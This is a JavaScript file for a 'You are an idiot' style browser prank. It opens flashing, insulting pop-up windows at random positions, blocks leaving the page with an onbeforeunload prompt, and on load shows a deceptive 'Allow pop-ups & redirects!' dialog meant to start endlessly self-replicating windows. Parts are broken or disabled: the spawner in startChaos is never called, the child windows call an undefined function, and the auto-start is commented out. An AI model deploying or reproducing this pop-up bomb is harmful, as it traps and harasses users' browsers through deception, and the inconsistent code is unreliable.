function openWindow(url) {
    var newWin = window.open("", "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');

    // Move the new window to a random location once
    if (newWin) {
        var screenWidth = screen.width - 357; // Keep within bounds
        var screenHeight = screen.height - 330;

        var randomX = Math.floor(Math.random() * screenWidth);
        var randomY = Math.floor(Math.random() * screenHeight);

        newWin.moveTo(randomX, randomY);

        // Write custom content inside the blank page
        newWin.document.write(`
            <html>
            <head>
                <title>YOU ARE AN IDIOT</title>
                <style>
                    body { background: red; color: white; text-align: center; font-size: 24px; margin-top: 100px; }
                </style>
            </head>
            <body>
                <h1>You are an IDIOT!</h1>
                <script>
                    setInterval(() => {
                        document.body.style.background = document.body.style.background === 'red' ? 'blue' : 'red';
                    }, 500);
                </script>
            </body>
            </html>
        `);
    }

    return newWin;
}

function proCreate() {
    setInterval(() => {
        for (var i = 0; i < 5; i++) {
            openWindow('lol.html');
        }
    }, 100); // Adjust delay as needed
}

window.onbeforeunload = function () {
    return "Are you an idiot?";
};


function requestPopUpPermission() {
    var popUpWin = window.open("about:blank", "_blank", "width=400,height=200");

    if (popUpWin) {
        popUpWin.document.write(`
            <html>
            <head><title>Allow Pop-ups</title></head>
            <body style="text-align:center; font-family:sans-serif;">
                <h2>Allow pop-ups & redirects!</h2>
                <button id="start">OK</button>
                <script>
                    document.getElementById('start').onclick = function() {
                        window.opener.startChaos();
                        window.close();
                    };
                </script>
            </body>
            </html>
        `);
        popUpWin.document.close();
    }
}

// Function to spawn windows infinitely
function startChaos() {
    function openSelfReplicatingWindow() {
        var newWin = window.open("about:blank", "_blank", 'width=357,height=330');

        if (newWin) {
            var screenWidth = screen.width - 357;
            var screenHeight = screen.height - 330;
            var randomX = Math.floor(Math.random() * screenWidth);
            var randomY = Math.floor(Math.random() * screenHeight);

            newWin.moveTo(randomX, randomY);

            // Inject HTML + self-replicating script
            newWin.document.write(`
                <html>
                <head>
                    <title>You Are an Idiot!</title>
                    <style>
                        body { background: yellow; color: black; text-align: center; font-size: 20px; margin-top: 100px; }
                    </style>
                </head>
                <body>
                    <h1>You are an IDIOT! 🤡</h1>
                    <script>
                        function spawnMore() {
                            for (var i = 0; i < 3; i++) {
                                var childWin = window.open("about:blank", "_blank", "width=357,height=330");
                                if (childWin) {
                                    childWin.document.write('<script>setTimeout(spawnMore, 1000);<\\/script>');
                                    childWin.document.close();
                                }
                            }
                        }
                        setTimeout(spawnMore, 1000);
                    </script>
                </body>
                </html>
            `);

            newWin.document.close();
        }
    }
}
    // Start with a few windows
    /*for (let i = 0; i < 3; i++) {
        openSelfReplicatingWindow();
    }
}*/

// Auto-run permission request on page load
window.onload = requestPopUpPermission;


// Self-executing function to start immediately
/*(function () {
        proCreate();
})();
*/
